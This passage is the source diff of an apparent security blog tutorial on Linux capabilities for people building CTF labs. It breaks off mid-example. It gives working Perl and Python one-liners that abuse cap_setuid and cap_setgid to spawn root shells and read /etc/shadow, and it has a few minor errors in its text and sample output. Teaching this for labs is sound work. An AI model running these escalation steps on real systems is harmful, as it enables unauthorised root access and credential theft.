@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Capabilities  for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-capabilities/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Capabilities  for CTF Creators">
+  <meta property="og:description" content="Permissions or capabilities?">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:32:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:32:00+08:00">
+    <meta property="article:tag" content="Capabilities">
+    <meta property="article:tag" content="Cap_setuid">
+    <meta property="article:tag" content="Cap_setgid">
+    <meta property="article:tag" content="Cap_sys_admin">
+    <meta property="article:tag" content="Cap_chown">
+    <meta property="article:tag" content="Cap_fowner">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Capabilities  for CTF Creators">
+  <meta name="twitter:description" content="Permissions or capabilities?">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-capabilities/" /><link rel="prev" href="//localhost:1313/linux-privesc-credential-hunting/" /><link rel="next" href="//localhost:1313/linux-privesc-timers/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Capabilities  for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-capabilities\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "capabilities, cap_setuid, cap_setgid, cap_sys_admin, cap_chown, cap_fowner","wordcount":  2310 ,
+        "url": "\/\/localhost:1313\/linux-privesc-capabilities\/","datePublished": "2021-12-28T11:32:00+08:00","dateModified": "2021-12-28T11:32:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Capabilities  for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2310 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#capabilities">Capabilities</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#privileged-processes">Privileged Processes</a></li>
+            <li><a href="#unprivileged-processes">Unprivileged Processes</a></li>
+          </ul>
+        </li>
+        <li><a href="#capabilities-commands">Capabilities Commands</a></li>
+        <li><a href="#process-capabilities">Process Capabilities</a></li>
+        <li><a href="#dropping-capabilities-with-capsh">Dropping Capabilities with Capsh</a></li>
+        <li><a href="#working-with-capabilities">Working with Capabilities</a></li>
+        <li><a href="#dangerous-capabilites">Dangerous Capabilites</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-cap_setuid">Privilege Escalation via CAP_SETUID</a>
+      <ul>
+        <li><a href="#perl-example">Perl Example</a></li>
+        <li><a href="#python-example">Python Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-cap_setgid">Privilege Escalation via CAP_SETGID</a>
+      <ul>
+        <li><a href="#perl-example-1">Perl Example</a></li>
+        <li><a href="#python-example-1">Python Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-cap_sys_admin">Privilege Escalation via CAP_SYS_ADMIN</a>
+      <ul>
+        <li><a href="#mounting-file-system-example">Mounting File System Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-cap_fowner">Privilege Escalation via CAP_FOWNER</a>
+      <ul>
+        <li><a href="#perl-example-2">Perl Example</a></li>
+        <li><a href="#python-example-2">Python Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-cap_chown">Privilege Escalation via CAP_CHOWN</a></li>
+    <li><a href="#defense">Defense</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="capabilities">Capabilities</h1>
+<p>In UNIX systems, there are two categories of processes:</p>
+<h3 id="privileged-processes">Privileged Processes</h3>
+<ul>
+<li><strong>Effective UID is zero (0)</strong>, referred to as root.</li>
+<li><strong>Bypasses kernel permissions checks</strong>.</li>
+</ul>
+<h3 id="unprivileged-processes">Unprivileged Processes</h3>
+<ul>
+<li><strong>Effective UID is nonzero</strong>.</li>
+<li><strong>Full permissions checking is required</strong>.</li>
+</ul>
+<p>Since the release of kernel 2.2, Linux has divided the privileges associated with the superuser into units known as capabilities. These capabilities can be enabled or disabled. For more information about capabilities, please refer to the official documentation.</p>
+<h2 id="capabilities-commands">Capabilities Commands</h2>
+<p>These are the commands that we can use for working with capabilities:</p>
+<ul>
+<li>setcap - Set File Capabilities</li>
+<li>setpcaps - Set Process Capabilities</li>
+<li>getcap - Get File Capabilities</li>
+<li>getpcaps – Get Process Capabilities</li>
+<li>capsh - Capability Shell Wrapper</li>
+</ul>
+<h2 id="process-capabilities">Process Capabilities</h2>
+<p>We can find the capabilities of the current process with either of the following commands:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat /proc/self/status <span class="o">||</span> capsh --print
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can find the capabilities of another user with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat /proc/&lt;pid&gt;/status
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>These can be decoded with capsh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ cat /proc/1911963/status <span class="p">|</span> grep Cap
+</span></span><span class="line"><span class="cl">CapInh:    <span class="m">0000000000000000</span>
+</span></span><span class="line"><span class="cl">CapPrm:    <span class="m">0000000000000000</span>
+</span></span><span class="line"><span class="cl">CapEff:    <span class="m">0000000000000000</span>
+</span></span><span class="line"><span class="cl">CapBnd:    000001ffffffffff
+</span></span><span class="line"><span class="cl">CapAmb:    <span class="m">0000000000000000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ capsh --decode<span class="o">=</span>000001ffffffffff
+</span></span><span class="line"><span class="cl"><span class="nv">0x000001ffffffffff</span><span class="o">=</span>cap_chown,cap_dac_override...&lt;SNIP&gt;...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="dropping-capabilities-with-capsh">Dropping Capabilities with Capsh</h2>
+<p>If we drop the CAP_NET_RAW capabilities for ping, then the ping utility should no longer work:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">capsh --drop<span class="o">=</span>cap_net_raw --print -- -c <span class="s2">&#34;tcpdump&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Besides the output of capsh itself, the tcpdump command itself should also raise an error.</p>
+<h2 id="working-with-capabilities">Working with Capabilities</h2>
+<p>We can use setcap to add capabilities to a file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">setcap cap_setuid+ep &lt;filename&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can examine capabilities with getcap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">getcap &lt;filename&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can search for all capabilities:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">getcap –r &lt;filename&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can remove capabilities with setcap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">setcap
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="dangerous-capabilites">Dangerous Capabilites</h2>
+<p>The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Capabilities Name</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CAP_AUDIT_CONTROL</td>
+          <td>Allow to enable/disable kernel auditing</td>
+      </tr>
+      <tr>
+          <td>CAP_AUDIT_WRITE</td>
+          <td>Helps to write records to kernel auditing log</td>
+      </tr>
+      <tr>
+          <td>CAP_BLOCK_SUSPEND</td>
+          <td>This feature can block system suspends</td>
+      </tr>
+      <tr>
+          <td>CAP_CHOWN</td>
+          <td>Allow user to make arbitrary change to files UIDs and GIDs</td>
+      </tr>
+      <tr>
+          <td>CAP_DAC_OVERRIDE</td>
+          <td>This helps to bypass file read, write and execute permission checks</td>
+      </tr>
+      <tr>
+          <td>CAP_DAC_READ_SEARCH</td>
+          <td>This only bypass file and directory read/execute permission checks</td>
+      </tr>
+      <tr>
+          <td>CAP_FOWNER</td>
+          <td>This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file</td>
+      </tr>
+      <tr>
+          <td>CAP_KILL</td>
+          <td>Allow the sending of signals to processes belonging to others</td>
+      </tr>
+      <tr>
+          <td>CAP_SETGID</td>
+          <td>Allow changing of the GID</td>
+      </tr>
+      <tr>
+          <td>CAP_SETUID</td>
+          <td>Allow changing of the UID</td>
+      </tr>
+      <tr>
+          <td>CAP_SETPCAP</td>
+          <td>Helps to transferring and removal of current set to any PID</td>
+      </tr>
+      <tr>
+          <td>CAP_IPC_LOCK</td>
+          <td>This helps to lock memory</td>
+      </tr>
+      <tr>
+          <td>CAP_MAC_ADMIN</td>
+          <td>Allow MAC configuration or state changes</td>
+      </tr>
+      <tr>
+          <td>CAP_NET_RAW</td>
+          <td>Use RAW and PACKET sockets</td>
+      </tr>
+      <tr>
+          <td>CAP_NET_BIND_SERVICE</td>
+          <td>SERVICE Bind a socket to internet domain privileged ports</td>
+      </tr>
+      <tr>
+          <td>CAP_SYS_ADMIN</td>
+          <td>This means that you can mount/umount filesystems.</td>
+      </tr>
+      <tr>
+          <td>CAP_SYS_PTRACE</td>
+          <td>This means that you can escape the container by injecting a shellcode inside some process running inside the host.</td>
+      </tr>
+      <tr>
+          <td>CAP_SYS_MODULE</td>
+          <td>This means that you can insert/remove kernel modules in/from the kernel of the host machine.</td>
+      </tr>
+      <tr>
+          <td>OTHERS&hellip;..</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="privilege-escalation-via-cap_setuid">Privilege Escalation via CAP_SETUID</h1>
+<p>The CAP_SETUID capability allows a process to set the user ID (UID) of a process. This is crucial for operations that require changing the effective user ID, real user ID, or saved set-user-ID of a process. Essentially, it enables a process to assume the identity of another user, which is typically necessary for tasks that require elevated privileges.</p>
+<h2 id="perl-example">Perl Example</h2>
+<p>Copy the python3 binary to our current working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp <span class="k">$(</span>which perl<span class="k">)</span> . 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Assign the <code>cap_setuid</code> capability:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo setcap cap_setuid+ep ./perl 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can review the capability with the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">getcap ./perl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output</span>
+</span></span><span class="line"><span class="cl">./perl <span class="nv">cap_setuid</span><span class="o">=</span>ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run a bash with <code>uid</code> of <code>0</code> as shown in the variable <code>$uid = 0</code> which is the root UID, and bash with <code>exec(&quot;/bin/bash&quot;)</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./perl -e <span class="s1">&#39;my $uid = 0; $&lt; = $uid; $&gt; = $uid; exec(&#34;/bin/bash&#34;);&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This will result in root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@pwn:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,122<span class="o">(</span>lpadmin<span class="o">)</span>,135<span class="o">(</span>lxd<span class="o">)</span>,136<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="python-example">Python Example</h2>
+<p>We&rsquo;ll copy the python3 binary to our current working directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp <span class="k">$(</span>which python3<span class="k">)</span> . 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;ll assign the <code>cap_setuid</code> capability to the python3 executable that&rsquo;s in the current folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo setcap cap_setuid+ep ./python3 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can review the capability with the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">getcap ./python3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run a bash shell with <code>setuid</code> of <code>0</code> as shown in <code>os.setuid(0)</code> which is the root UID, and bash with <code>os.system(&quot;/bin/bash&quot;)</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This will also result in root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@pwn:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,122<span class="o">(</span>lpadmin<span class="o">)</span>,135<span class="o">(</span>lxd<span class="o">)</span>,136<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-cap_setgid">Privilege Escalation via CAP_SETGID</h1>
+<p>The CAP_SETGID capability allows a process to set the group ID (GID) of a process. This capability is similar to CAP_SETUID but applies to group IDs. It allows a process to change its effective group ID, real group ID, or saved set-group-ID. This is important for operations that need to change the group identity of a process, enabling it to perform actions on behalf of a different group.</p>
+<h2 id="perl-example-1">Perl Example</h2>
+<p>Copy the Perl binary to the current folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cp <span class="k">$(</span>which perl<span class="k">)</span> . 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The capability <code>CAP_SETGID</code> allows us to <strong>set the <code>EGID</code> of the created process</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./perl
+</span></span><span class="line"><span class="cl">user@pwn:~$ getcap -r ./perl
+</span></span><span class="line"><span class="cl">./perl <span class="o">=</span> cap_setgid+ep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>View the groups:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/group <span class="p">|</span> grep shadow
+</span></span><span class="line"><span class="cl">shadow:x:42:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run this Perl code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">./</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;my $gid = 42; $&lt; = $gid; $&gt; = $gid; exec(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">./</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;$) = 42; exec(&#34;/bin/bash&#34;);&#39;</span>   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this case, the <code>shadow</code> group was impersonated so we can read the file <code>/etc/shadow</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -l /etc/shadow
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">1610</span> oct <span class="m">25</span> 25:45 /etc/shadow
+</span></span><span class="line"><span class="cl">user@pwn:~$ groups
+</span></span><span class="line"><span class="cl">shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user
+</span></span><span class="line"><span class="cl">user@pwn:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>42<span class="o">(</span>shadow<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>42<span class="o">(</span>shadow<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/shadow
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>.:18918:0:99999:7:::
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="python-example-1">Python Example</h2>
+<p>Copy the Python binary to the current folder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cp <span class="k">$(</span>which python3<span class="k">)</span> . 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The capability <code>CAP_SETGID</code> allows us to <strong>set the <code>EGID</code> of the created process</strong>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
